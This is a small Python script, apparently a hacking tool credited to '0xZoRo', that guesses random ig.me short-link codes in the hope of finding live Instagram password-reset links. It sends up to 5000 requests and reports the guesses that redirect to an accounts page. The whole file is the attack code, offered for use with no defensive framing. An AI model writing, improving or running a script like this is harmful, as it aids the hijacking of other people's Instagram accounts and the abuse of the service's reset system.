import random
import requests


def Intro():
    print('''
                                                .     .       .  .   . .   .   . .    +  .
                                              .     .  :     .    .. :. .___---------___.
                                                   .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_. .
                                                .  :       .  .  .:../:            . .^  :.:\.
                                                    .   . :: +. :.:/: .   .    .        . . .:\.
                                             .  :    .     . _ :::/:               .  ^ .  . .:|\.
                                              .. . .   . - : :.:./.                        .  .:\.
                                              .      .     . :..|:                    .  .  ^. .:|
                                                .       . : : ..||        .                . . !:|
                                              .     . . . ::. ::\(                           . :)|
                                             .   .     : . : .:.|. ######              .#######::|
                                              :.. .  :-  : .:  ::|.#######           ..########:|
                                             .  .  .  ..  .  .. :\ ########          :######## :/
                                              .        .+ :: : -.:\ ########       . ########.:/
                                                .  .+   . . . . :.:\. #######       #######..:/
                                                  :: . . . . ::.:..:.\           .   .   ..:/
                                               .   .   .  .. :  -::::.\.       | |     . .:/
                                                  .  :  .  .  .-:.":.::.\             ..:/
                                             .      -.   . . . .: .:::.:.\.           .:/
                                            .   .   .  :      : ....::_:..:\   ___.  :/
                                               .   .  .   .:. .. .  .: :.:.:\       :/
                Info                             +   .   .   : . ::. :.:. .:.|\  .:/|
         Program By : 0xZoRo                     .         +   .  .  ...:: ..|  --.:|
           Instagram : @9du                        . . .   .  .  . ... :..:.."(  ..)"
    Github : https://www.github.com/0xZoRo/      .       .      :  .   .: ::/  .  .::\.

            - This Script Use Random Library For Generate Link Reset Password Instagram .
            - No Need To Use Proxy Or Any Thing Else .''')
def Start():
    ran = int(input('            * How Many Attempts You Want ? 1 - 5000 : '))
    for i in range(ran):
        gen = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
        Ran = random.choices(gen,k=15)
        list = ''.join(Ran)
        URLL = 'https://ig.me/%s/' %list
        req = requests.get(URLL)
        if 'accounts' in req.url:
            print('Found > %s' %req.url)
        else:
            print('Not Found > %s'%req.url,list)#;print(req)
Intro()
Start()
while True:
        input('\n          # Finished I Hope You Enjoy :) .')
